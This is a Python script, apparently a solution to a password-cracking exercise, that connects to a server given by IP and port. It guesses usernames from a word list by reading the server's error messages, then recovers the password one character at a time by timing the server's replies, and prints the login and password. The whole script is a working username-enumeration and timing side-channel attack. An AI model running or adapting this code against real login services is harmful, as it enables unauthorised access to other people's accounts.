import socket
import argparse
import json
import string
import time

parser = argparse.ArgumentParser()

# opens the file and stores all the passwords in a variable passwords
path = "logins.txt"
f = open(path, 'r')
logins = f.read().split("\n")
f.close()


# creating a class makes the solution more clear
class Connect:
    def __init__(self, ip_address, port):
        self.ip = ip_address
        self.port = int(port)
        self.loglist = logins
        self.user_socket = socket.socket()
        self.connect()
        self.login = self.guess_login()
        self.password = self.guess_password()
        self.close()
        self.login_password()

    def connect(self):
        address = (self.ip, self.port)
        self.user_socket.connect(address)

    def send_message(self, message):
        self.user_socket.send(message.encode())

    def guess_login(self):
        for log in self.loglist:
            login = {'login': log, 'password': ' '}
            self.send_message(json.dumps(login))
            response = self.receive()
            if response['result'] == 'Wrong password!':
                return log

    def guess_password(self):
        password = ''
        self.send_message(json.dumps({'login': self.login, 'password': password}))
        def_start = time.perf_counter()
        self.receive()
        def_end = time.perf_counter()
        def_time = def_end - def_start
        while True:
            for char in string.ascii_letters + string.digits:
                password_dict = {'login': self.login, 'password': password + char}
                self.send_message(json.dumps(password_dict))
                start = time.perf_counter()
                response = self.receive()
                end = time.perf_counter()
                response_time = end - start
                if response['result'] == 'Wrong password!':
                    if response_time > def_time:
                        password += char
                if response['result'] == 'Connection success!':
                    password += char
                    return password

    def login_password(self):
        login_password = {'login': self.login, 'password': self.password}
        print(json.dumps(login_password))

    def receive(self):
        response = self.user_socket.recv(1024)
        response = response.decode()
        response = json.loads(response)
        return response

    def close(self):
        self.user_socket.close()


# creates 2 positional arguments
parser.add_argument('ip_address')
parser.add_argument('port')

args = parser.parse_args()  # passes all arguments under a variable args for easier callings

Connect(args.ip_address, args.port)
